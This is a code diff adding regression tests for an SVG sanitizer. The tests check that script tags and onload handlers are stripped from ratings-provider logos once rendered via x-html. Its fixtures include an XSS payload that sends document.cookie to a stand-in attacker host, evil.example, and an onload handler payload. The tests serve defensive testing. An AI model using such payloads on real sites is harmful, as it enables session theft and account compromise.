@@ -110,4 +110,23 @@ describe('sanitizeSvg', () => {
             expect(result).toContain('href="https://example.com"');
         });
     });
+
+    describe('ratings logo SVG (regression)', () => {
+        it('strips script from a provider logo SVG containing an injected script tag', () => {
+            // Regression: r.logoSvg in the ratings badge was rendered with x-html without
+            // sanitization. A compromised or malicious ratings provider could inject a script.
+            const maliciousLogo = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.example/steal?c="+document.cookie)</script><path d="M0 0h24v24H0z"/></svg>';
+            const result = sanitizeSvg(maliciousLogo);
+            expect(result).not.toContain('<script');
+            expect(result).not.toContain('document.cookie');
+            expect(result).toContain('<path');
+        });
+
+        it('strips onload handler from a provider logo SVG', () => {
+            const maliciousLogo = '<svg xmlns="http://www.w3.org/2000/svg" onload="evil()"><circle r="10"/></svg>';
+            const result = sanitizeSvg(maliciousLogo);
+            expect(result).not.toContain('onload');
+            expect(result).toContain('<circle');
+        });
+    });
 });
